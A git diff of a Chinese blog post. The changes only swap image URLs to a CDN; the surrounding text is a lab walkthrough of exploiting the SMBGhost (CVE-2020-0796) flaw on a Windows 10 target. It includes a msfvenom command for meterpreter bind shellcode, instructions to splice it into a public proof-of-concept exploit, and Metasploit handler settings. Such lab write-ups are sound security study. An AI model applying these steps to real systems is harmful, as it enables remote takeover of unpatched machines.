@@ -325,7 +325,7 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(http://zerosai7.gitee.io/images/customs/msf-b.jpg);" src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v1.2/img/loader/orange.progress-bar-stripe-loader.svg" data-src="http://zerosai7.gitee.io/images/customs/msf-b.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/msf-b.jpg);" src="https://cdn.jsdelivr.net/gh/zerosai7/cdn@v1.2/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/msf-b.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
@@ -361,16 +361,16 @@
 <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>永恒之黑是针对win10 20之前的版本，之后的版本就修复了该漏洞，因此下镜像的时候同样也要注意一下版本</p>
 <h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p>（前面的攻击过程和永恒之蓝差不多，这里就稍微带一下，具体的可以去看上篇文章QAQ）</p>
 <p>使用SMBGhost中的scanner.py可以查看靶机是否有该漏洞，下载地址：<a target="_blank" rel="noopener" href="https://github.com/ly4k/SMBGhost/blob/master/scanner.py">https://github.com/ly4k/SMBGhost/blob/master/scanner.py</a></p>
-<p> <img src="http://zerosai7.gitee.io/images/customs/clip_image002.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/clip_image002.jpg" alt="clip_image002"></p>
 <p>用msfvenom生成shellcode来反弹shell，指令如下</p>
 <pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b &#39;\x00&#39; -i 1 -f python
 </code></pre>
-<p><img src="http://zerosai7.gitee.io/images/customs/b1.png" alt="b1"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/b1.png" alt="b1"></p>
 <p>之后使用SMBGhost中的payload，下载地址如下：<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
 <p>打开其中的exploit.py，下图所在位置的shellcode替换成我们上面生成的shellcode，注意要把buf全部换成USER_PAYLOAD</p>
-<p><img src="http://zerosai7.gitee.io/images/customs/b2.png" alt="b2"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/b2.png" alt="b2"></p>
 <p>输入msfconsole打开终端（msf终端每次开出来的都不一样，感兴趣的可以多刷几次看看）</p>
-<p><img src="http://zerosai7.gitee.io/images/customs/image-20220121145643517.png" alt="image-20220121145643517"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/image-20220121145643517.png" alt="image-20220121145643517"></p>
 <p>先是使用此攻击模块</p>
 <pre><code>use exploit/multi/handler
 </code></pre>
@@ -381,11 +381,11 @@
 <pre><code>set lport 4444
 set rhost 靶机ip
 </code></pre>
-<p><img src="http://zerosai7.gitee.io/images/customs/b4.png" alt="b4"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/b4.png" alt="b4"></p>
 <p>运行刚才的exploit.py</p>
-<p><img src="http://zerosai7.gitee.io/images/customs/b5.png" alt="b5"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/b5.png" alt="b5"></p>
 <p>之后便来到了熟悉的meterpreter界面，成功夺取控制权，具体在meterpreter可以进行的操作可以看上一篇^^</p>
-<p><img src="http://zerosai7.gitee.io/images/customs/b6.png" alt="b6"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zerosai7/cdn/img/custom/b6.png" alt="b6"></p>
 
         </div>
         <!-- .entry-content -->
